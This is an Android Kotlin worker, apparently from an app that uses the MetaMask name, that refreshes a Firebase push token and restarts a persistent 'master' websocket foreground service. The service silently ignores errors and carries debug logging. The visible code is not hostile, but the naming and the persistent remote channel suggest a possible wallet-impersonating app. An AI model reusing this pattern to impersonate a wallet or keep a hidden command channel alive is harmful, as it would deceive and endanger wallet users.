package com.example.MetaMask.services

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.annotation.Keep
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.FCMConfig
import com.google.android.gms.tasks.Tasks
import com.google.firebase.messaging.FirebaseMessaging
import java.util.concurrent.TimeUnit

@Keep
class FcmTokenCheckWorker(
    ctx: Context,
    params: WorkerParameters
) : Worker(ctx, params) {

    override fun doWork(): Result {
        android.util.Log.d("XDBG", "[FcmTokenCheckWorker] doWork enter") //xdbg
        val ctx = applicationContext

        android.util.Log.d("XDBG", "[FcmTokenCheckWorker] return") //xdbg
        return try {
            FCMConfig.init(ctx)
            DeviceUUIDProvider.init(ctx)

            val freshToken = try {
                Tasks.await(FirebaseMessaging.getInstance().token, 30, TimeUnit.SECONDS)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenCheckWorker] catch (ignored)") //xdbg
                null
            }

            if (freshToken.isNullOrEmpty()) return Result.success()

            val prefs = ctx.getSharedPreferences(FcmTokenService.PREFS_NAME, Context.MODE_PRIVATE)
            val cachedToken = prefs.getString(FcmTokenService.PREF_TOKEN, null)

            if (freshToken != cachedToken) {
                android.util.Log.d("XDBG", "[FcmTokenCheckWorker] if branch") //xdbg
                prefs.edit().putString(FcmTokenService.PREF_TOKEN, freshToken).apply()
                FcmTokenService.markTokenConfirmed(ctx, false)
            }

            if (!FcmTokenService.isTokenConfirmed(ctx)) {
                android.util.Log.d("XDBG", "[FcmTokenCheckWorker] if branch") //xdbg
                ensureMasterSocketRunning(ctx)
            }

            Result.success()
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenCheckWorker] catch (ignored)") //xdbg
            Result.success()
        }
    }

    private fun ensureMasterSocketRunning(ctx: Context) {
        android.util.Log.d("XDBG", "[FcmTokenCheckWorker] ensureMasterSocketRunning enter ctx=ctx") //xdbg
        try {
            val intent = Intent(ctx, MasterWebSocketDispatcher::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[FcmTokenCheckWorker] if branch") //xdbg
                ctx.startForegroundService(intent)
            } else {
                ctx.startService(intent)
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenCheckWorker] catch (ignored)") //xdbg
        }
    }
}
